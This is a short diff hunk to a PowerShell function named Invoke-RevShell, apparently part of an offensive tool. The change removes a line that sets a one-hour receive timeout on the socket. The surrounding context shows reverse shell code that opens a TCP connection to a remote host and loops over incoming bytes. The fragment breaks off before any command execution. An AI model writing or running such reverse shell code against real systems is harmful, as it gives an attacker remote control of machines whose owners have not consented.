@@ -50,7 +50,6 @@ function Invoke-RevShell {
         try {
             $client = New-Object System.Net.Sockets.TCPClient(remote);
             Write-Output "Connections Success!"
-            $client.ReceiveTimeout = 3600000; # 1 hours
             $stream = $client.GetStream();
             [byte[]]$bytes = 0..65535 | %{0};
             while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
